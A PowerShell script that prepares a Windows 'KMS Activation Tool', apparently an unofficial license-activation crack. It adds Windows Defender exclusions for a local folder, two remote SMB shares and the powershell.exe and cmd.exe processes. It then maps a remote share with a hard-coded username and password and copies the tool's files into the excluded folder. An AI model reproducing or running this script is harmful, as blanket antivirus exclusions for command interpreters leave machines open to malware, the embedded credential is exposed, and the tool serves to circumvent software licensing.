<#
.SYNOPSIS
    This Script will Prepare KMS Activation Tool
    for Windows 10/11 and Windows Server 2012+
    with Activated Microsoft Windows Defender Antivirus
    The Script must be Run with Elevated Privileges.
.DESCRIPTION
    This Script will Prepare KMS Activation Tool
.NOTES
    File name: Build-ForRegister00.ps1
    VERSION: 1.0.0a
    AUTHOR: New Internet Technologies Inc.
    Created:  2024-02-21
    Licensed under the BSD license.
    Please credit me if you find this script useful and do some cool things with it.
.VERSION HISTORY:
    1.0.0 - (2024-02-21) Script created
    1.0.1 - 
#>

### Set a Variables
#
$BINDIR="C:\.BIN"
$REMOTEDIR00="\\win.netip4.ru\NIT"
$REMOTEDIR01="\\win.netip4.ru\Users\vagrant"
$REMOTE_USERS="win.netip4.ru\vagrant"
$REMOTE_PASS="0a9s8d7F"
$REMOTEFOLDERNAME0001="KMS.TOOLS"

$VMNAME="win.netip4.ru"
$VM_SMBPORT="445"


##### Derivative Variables
$Local_DIR0001=Join-Path -Path $BINDIR -ChildPath $REMOTEFOLDERNAME0001
$Remote_Dir0001=$REMOTEDIR00+"\"+$REMOTEFOLDERNAME0001

function Test-Admin {
    $currentUser = New-Object Security.Principal.WindowsPrincipal $([Security.Principal.WindowsIdentity]::GetCurrent())
    $currentUser.IsInRole([Security.Principal.WindowsBuiltinRole]::Administrator)
}

### Run Payloads
#

#### Test if Host Up
#
### Test Ping Connection
#
$pingtest = Test-Connection -ComputerName $VMNAME -Quiet -Count 1 -ErrorAction SilentlyContinue
if($pingtest){
    Write-Host($VMNAME + " is online")
    $pingport = Test-NetConnection -ComputerName $VMNAME -Port $VM_SMBPORT -ErrorAction SilentlyContinue
    if($pingport){
        Write-Host( "The Port " +$VM_SMBPORT+" is open" )
        # $vmsess = New-PSSession -HostName $VMNAME -Port $$VM_SSHPORT -UserName $VM_USER -SSHTransport
    }
    else {
        Write-Host( "The Port "+$VM_SMBPORT+" is not reacable")
        Exit 2
    }
}
else{
    Write-Host($VMNAME + " is not reachable")
    Exit 2
}

###### Make .BIN Dir
#

if( !(Test-Admin)) {
    Write-Host "Error! The Script must be Run with Elevated Privileges. Exit"
    Exit 17
}

if( !(Test-Path $BINDIR )) {
    New-Item -Path $BINDIR -ItemType "directory"
}

#### Add Antivirus Exclusions
#
Add-MpPreference -ExclusionPath $BINDIR -Force
Add-MpPreference -ExclusionPath $REMOTEDIR01 -Force
Add-MpPreference -ExclusionPath $REMOTEDIR00 -Force
Add-MpPreference -ExclusionProcess powershell.exe
Add-MpPreference -ExclusionProcess cmd.exe

## If KMS Folder Not Exist
#
if( !(Test-Path $Local_DIR0001 )) {
    Write-Host "Create  $Local_DIR0001 if not Exist."
    New-Item -Path $Local_DIR0001 -ItemType "directory"
    Set-Location -Path $Local_DIR0001
    & net.exe use X: $Remote_Dir0001 $REMOTE_PASS /USER:$REMOTE_USERS /PERSISTENT:No
    & xcopy x:\*.* . /S /E /V 
    & net.exe use X: /Delete
    Write-Host "$Local_DIR0001 has successfully Created and Copied"
    Exit 0
}
else{
    Write-Host "$Local_DIR0001 is already Exist!"
    Exit 2
}

